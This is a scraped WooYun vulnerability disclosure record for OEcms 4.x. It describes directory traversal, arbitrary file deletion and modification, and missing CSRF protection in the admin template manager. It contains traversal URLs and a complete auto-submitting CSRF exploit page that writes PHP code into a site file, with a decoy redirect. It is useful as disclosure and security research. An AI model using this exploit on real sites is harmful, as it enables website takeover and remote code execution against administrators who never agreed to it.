{"id": 1028, "wybug_id": "wooyun-2014-067089", "wybug_title": "代码审计系列9: OEcms 远程代码执行(CSRF)", "wybug_corp": "OECMS", "wybug_author": "LaiX", "wybug_date": "2014-07-03 11:22", "wybug_open_date": "2014-10-01 11:24", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["错误信息未屏蔽", "源码审核", "任意文件写入利用", "后台权限提升", "模板文件操作参数未过滤", "敏感文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-03：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-10-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： OECMS Ver 4.X(企业网站系统)是由奥壹技术（OEdev）基于自主研发的OEPHP架构体系开发的一套企业建站系统。OEcms采用MVC开发模式，轻巧、灵活、易用、易于二次开发。OEcms新版支持7种模型：文章模型、产品模型、图库模型、下载模型、招聘模型、单页模型和外部模型，支持自定义字段、支持自定义模板文件、支持自定义模型SEO等；用户可在后台添加、修改、删除模型，随心所遇建立属于自己的企业网站。 详细说明：  问题1.后台-界面模板-模板管理-模板文件 处存在 任意目录遍历、任意文件删除、任意文件修改、绝对路径泄露等漏洞。问题2.整个后台都没有对CSRF进行任何防护措施。可以导致攻击者劫持操纵作后台，添加管理账户等危险操作。   漏洞证明：  例：目录遍历\nhttp://localhost/admincp.php?c=templet&dir=\\..\\..\\..\\\n\n\n例：任意文件修改 \n\n例：任意文件删除\nhttp://localhost/admincp.php?c=templet&a=delfile&id=%5C%5C..%5C%5C..%5C%5C..%5C%5C%2Findex.php\n远程删掉index.php文件例：绝对路径泄露\n\n再证明一个最危险的例子。通过 问题1+问题2 可以实现对该CMS进行CSRF执行远程代码的攻击,从而GETSHELL。exp:\n<html>   <meta charset = \"utf-8\">   <title>正在跳转...</title></html><h1>正在跳转...</h1><body>    <iframe id=\"_iframe\" src=\"about:blank\" style='display:none'></iframe></body><script>function CSRF(){    var topWin = window.top.document.getElementById(\"_iframe\").contentWindow;    topWin.document.write(                     \"<form id='_form' action='http://localhost/admincp.php?c=templet&a=saveedit' method='post'>\"                      +\"<input type='hidden' name='id' value='/../../..//source/plugin/index.php'>\"                      +\"<input type='hidden' name='dir' value='/../../..//source/plugin'>\"                      +\"<input type='hidden' name='content' value='<?php phpinfo(); ?>'>\"                       +\"</form>\"                      +\"<script>document.getElementById('_form').submit();<\\/script>\"                  );}CSRF();window.setTimeout(\"window.location.href='http://www.baidu.com/'\", 5000); //延迟5秒后跳转到指定网页</script></html>\n首先构造一个EXP。将构造好的EXP地址留言到目标的CMS当管理员打开我精心构造的网址之后：这个文件被修改成：\n\n我们再来访问\n\n   修复方案：  略   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-07-03 19:52 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  代码审计难吗？php需要什么水平才能审计？    \n     2014-10-01 12:22 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  我是来看这个系列的    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}